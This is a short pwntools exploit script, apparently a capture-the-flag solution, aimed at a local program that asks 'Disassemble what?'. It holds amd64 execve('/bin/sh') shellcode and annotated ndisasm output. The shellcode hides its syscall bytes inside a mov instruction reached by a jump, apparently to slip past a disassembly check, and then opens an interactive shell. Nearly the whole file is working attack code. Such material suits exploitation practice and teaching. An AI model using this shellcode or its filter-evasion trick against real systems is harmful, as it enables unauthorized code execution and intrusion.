from pwn import *

context.arch = "amd64"

if args.REMOTE:
  # fill in remote address
  p = remote()
elif args.REMOTE2:
  p = remote("localhost", 40003)
elif args.GDB:
  context.terminal = ["tmux", "splitw", "-h"]
  p = gdb.debug(binary, gdbscript=gs)
else:
  p = process("./vuln.pl")

# create exploit here

payload = asm("mov rdi, 0x68732f6e69622f; push rdi; mov rdi, rsp; xor rsi, rsi; xor rdx, rdx; mov eax, 0x30; mov ecx, 0xb; add rax, rcx; jmp $+5; mov rcx, 0x50f")
'''
ndisasm -b64 output:
00000000  48BF2F62696E2F73  mov rdi,0x68732f6e69622f
         -6800
0000000A  57                push rdi
0000000B  4889E7            mov rdi,rsp
0000000E  4831F6            xor rsi,rsi
00000011  4831D2            xor rdx,rdx
00000014  B830000000        mov eax,0x30
00000019  B90B000000        mov ecx,0xb
0000001E  4801C8            add rax,rcx
00000021  EB03              jmp short 0x26
00000023  48C7C10F050000    mov rcx,0x50f
'''
p.sendlineafter(b"Disassemble what?\n", payload)
p.interactive()